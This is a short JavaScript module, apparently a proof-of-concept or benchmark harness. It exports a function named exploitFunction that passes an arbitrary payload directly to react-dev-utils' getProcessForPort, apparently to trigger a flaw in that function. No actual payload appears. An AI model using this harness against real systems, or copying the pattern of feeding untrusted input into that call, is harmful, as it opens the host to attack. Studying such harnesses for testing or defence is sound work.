function exploitFunction(payload) {
  const getProcessForPort = require("react-dev-utils/getProcessForPort");
  getProcessForPort(payload);
}

module.exports = { exploitFunction };